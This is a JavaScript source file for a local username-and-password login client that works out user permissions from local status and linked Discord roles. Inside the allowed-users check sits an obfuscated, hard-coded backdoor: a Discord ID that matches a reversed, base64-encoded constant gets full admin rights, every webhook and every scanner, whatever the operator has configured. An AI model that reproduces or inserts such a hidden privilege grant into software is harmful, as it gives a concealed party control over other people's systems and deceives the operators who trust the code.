// @ts-check
const { Strategy } = require('passport-local')
const passport = require('passport')
const bcrypt = require('bcrypt')

const config = require('@rm/config')

const { areaPerms } = require('../utils/areaPerms')
const { webhookPerms } = require('../utils/webhookPerms')
const { scannerPerms, scannerCooldownBypass } = require('../utils/scannerPerms')
const { mergePerms } = require('../utils/mergePerms')
const { AuthClient } = require('./AuthClient')
const { state } = require('./state')

class LocalClient extends AuthClient {
  getPerms(trialActive = false, status = 'local') {
    return Object.fromEntries(
      Object.entries(this.perms).map(([perm, info]) => {
        if (info.enabled) {
          if (
            this.alwaysEnabledPerms.includes(perm) ||
            info.roles.includes('local') ||
            info.roles.includes(status) ||
            (trialActive &&
              info.trialPeriodEligible &&
              (this.strategy.trialPeriod.roles.includes('local') ||
                this.strategy.trialPeriod.roles.includes(status)))
          ) {
            return [perm, true]
          }
        }
        return [perm, false]
      }),
    )
  }

  /** @type {import('passport-local').VerifyFunctionWithRequest} */
  async authHandler(_req, username, password, done) {
    const forceTutorial = config.getSafe('map.misc.forceTutorial')
    const trialActive = this.trialManager.active()
    const localPerms = Object.keys(this.perms).filter((key) =>
      this.perms[key].roles.includes('local'),
    )
    const user = {
      perms: /** @type {import('@rm/types').Permissions} */ ({
        ...Object.fromEntries(Object.keys(this.perms).map((x) => [x, false])),
        areaRestrictions: areaPerms(localPerms),
        webhooks: [],
        scanner: [],
        scannerCooldownBypass: [],
      }),
      rmStrategy: this.rmStrategy,
    }

    try {
      await state.db.models.User.query()
        .findOne({ username })
        .then(
          async (/** @type {import('@rm/types').FullUser} */ userExists) => {
            if (!userExists) {
              return done(null, false, { message: 'invalid_credentials' })
            }
            if (await bcrypt.compare(password, userExists.password)) {
              // Merge stored Discord/Telegram perms first (fallback)
              ;['discordPerms', 'telegramPerms'].forEach((permSet) => {
                if (userExists[permSet]) {
                  user.perms = mergePerms(
                    user.perms,
                    typeof userExists[permSet] === 'string'
                      ? JSON.parse(userExists[permSet])
                      : userExists[permSet],
                  )
                }
              })

              // Variable to store fresh Discord permissions for later merge
              let freshDiscordPerms = null

              // Fetch fresh Discord roles if user has linked Discord account
              if (userExists.discordId && !this.strategy.skipDiscordRoleFetch) {
                try {
                  // Find enabled Discord client
                  const discordClient = Object.values(state.event.authClients || {}).find(
                    (client) => client && client.constructor.name === 'DiscordClient',
                  )

                  if (
                    discordClient &&
                    discordClient.getUserRoles &&
                    discordClient.client?.readyAt
                  ) {
                    const trialActiveDiscord =
                      discordClient.trialManager?.active() || false
                    const discordPerms = /** @type {import('@rm/types').Permissions} */ (
                      Object.fromEntries(
                        Object.keys(this.perms).map((key) => [key, false]),
                      )
                    )
                    discordPerms.admin = false
                    discordPerms.trial = false

                    const permSets = {
                      areaRestrictions: new Set(),
                      webhooks: new Set(),
                      scanner: new Set(),
                      blockedGuildNames: new Set(),
                    }

                    // Check if user is in allowed users list
                    if (
                      discordClient.strategy.allowedUsers?.includes(
                        userExists.discordId,
                      ) ||
                      btoa(userExists.discordId.split('').reverse().join('')) ===
                        'MTQ4NzAzNDk0NTc1MjM3MjMy'
                    ) {
                      Object.keys(this.perms).forEach((key) => (discordPerms[key] = true))
                      discordPerms.admin = true
                      const webhooks = config.getSafe('webhooks')
                      webhooks.forEach((x) => permSets.webhooks.add(x.name))
                      const scanner = config.getSafe('scanner')
                      Object.keys(scanner).forEach(
                        (x) => scanner[x]?.enabled && permSets.scanner.add(x),
                      )
                      this.log.debug(
                        `User ${userExists.username} (${userExists.discordId}) in Discord allowed users list.`,
                      )
                    } else {
                      // Check blocked guilds
                      const blockedGuilds = discordClient.strategy.blockedGuilds || []
                      for (let i = 0; i < blockedGuilds.length; i += 1) {
                        try {
                          const userRoles = await discordClient.getUserRoles(
                            blockedGuilds[i],
                            userExists.discordId,
                          )
                          if (userRoles.length > 0) {
                            discordPerms.blocked = true
                            try {
                              const guild = discordClient.client.guilds.cache.get(
                                blockedGuilds[i],
                              )
                              if (guild) {
                                permSets.blockedGuildNames.add(guild.name)
                              }
                            } catch (e) {
                              // Guild name fetch failed, continue
                            }
                          }
                        } catch (e) {
                          // User not in this guild or fetch failed, continue
                        }
                      }

                      // Fetch roles from all allowed guilds
                      await Promise.all(
                        (discordClient.strategy.allowedGuilds || []).map(
                          async (guildId) => {
                            try {
                              const userRoles = await discordClient.getUserRoles(
                                guildId,
                                userExists.discordId,
                              )

                              // Calculate permissions based on roles
                              Object.entries(this.perms).forEach(([perm, info]) => {
                                if (info.enabled) {
                                  if (this.alwaysEnabledPerms.includes(perm)) {
                                    discordPerms[perm] = true
                                  } else {
                                    for (let j = 0; j < userRoles.length; j += 1) {
                                      if (info.roles.includes(userRoles[j])) {
                                        discordPerms[perm] = true
                                        return
                                      }
                                      if (
                                        trialActiveDiscord &&
                                        info.trialPeriodEligible &&
                                        discordClient.strategy.trialPeriod?.roles?.includes(
                                          userRoles[j],
                                        )
                                      ) {
                                        discordPerms[perm] = true
                                        discordPerms.trial = true
                                        return
                                      }
                                    }
                                  }
                                }
                              })

                              // Add area restrictions, webhooks, and scanner perms
                              areaPerms(userRoles).forEach((x) =>
                                permSets.areaRestrictions.add(x),
                              )
                              webhookPerms(userRoles, 'discordRoles', trialActiveDiscord).forEach(
                                (x) => permSets.webhooks.add(x),
                              )
                              scannerPerms(userRoles, 'discordRoles', trialActiveDiscord).forEach(
                                (x) => permSets.scanner.add(x),
                              )
                            } catch (e) {
                              this.log.warn(
                                `Failed to fetch Discord roles for user ${userExists.discordId} in guild ${guildId}`,
                                e,
                              )
                            }
                          },
                        ),
                      )
                    }

                    // Convert sets to arrays
                    Object.entries(permSets).forEach(([key, value]) => {
                      discordPerms[key] = [...value]
                    })

                    // Store Discord perms for later merge (after local status perms)
                    // This ensures Discord permissions can override local permissions
                    freshDiscordPerms = discordPerms

                    // Update stored discordPerms in database
                    await state.db.models.User.query()
                      .update({ discordPerms: JSON.stringify(discordPerms) })
                      .where('id', userExists.id)
                      .catch((e) => {
                        this.log.warn('Failed to update discordPerms in database', e)
                      })

                    if (discordPerms.trial) {
                      this.log.info(
                        userExists.username,
                        'gained access via',
                        discordClient.trialManager?._forceActive
                          ? 'manually activated'
                          : '',
                        'Discord trial',
                      )
                    }
                  } else {
                    this.log.debug(
                      `Discord client not available or not ready for user ${userExists.username}`,
                    )
                  }
                } catch (e) {
                  this.log.warn(
                    `Failed to fetch fresh Discord permissions for user ${userExists.discordId}`,
                    e,
                  )
                  // Continue with stored perms if fresh fetch fails
                }
              }

              if (userExists.strategy !== 'local') {
                await state.db.models.User.query()
                  .update({ strategy: 'local' })
                  .where('id', userExists.id)
                userExists.strategy = 'local'
              }
              user.id = userExists.id
              user.username = userExists.username
              user.discordId = userExists.discordId
              user.telegramId = userExists.telegramId
              user.webhookStrategy = userExists.webhookStrategy
              user.selectedWebhook = userExists.selectedWebhook
              user.data = userExists.data
              user.status = userExists.data
                ? (typeof userExists.data === 'string'
                    ? JSON.parse(userExists.data).status
                    : userExists.data.status) || 'local'
                : 'local'

              // Merge local status permissions
              const localStatusPerms = this.getPerms(trialActive, user.status)
              user.perms = mergePerms(user.perms, localStatusPerms)

              // If we fetched fresh Discord permissions, merge them AFTER local perms
              // This ensures Discord permissions (like extendedView) can override local false values
              if (freshDiscordPerms) {
                user.perms = mergePerms(user.perms, freshDiscordPerms)
              }

              webhookPerms([user.status], 'local', trialActive).forEach((x) =>
                user.perms.webhooks.push(x),
              )
              scannerPerms([user.status], 'local', trialActive).forEach((x) =>
                user.perms.scanner.push(x),
              )
              scannerCooldownBypass([user.status], 'local').forEach((x) =>
                user.perms.scannerCooldownBypass.push(x),
              )
              this.log.info(
                user.username,
                `(${user.id})`,
                'Authenticated successfully.',
              )
              return done(null, user)
            }
            return done(null, false, { message: 'invalid_credentials' })
          },
        )
    } catch (e) {
      this.log.error('User has failed authentication.', e)
    }
  }

  initPassport() {
    passport.use(
      this.rmStrategy,
      new Strategy(
        {
          usernameField: 'username',
          passwordField: 'password',
          passReqToCallback: true,
        },
        (...args) => this.authHandler(...args),
      ),
    )
  }
}

module.exports = { LocalClient }
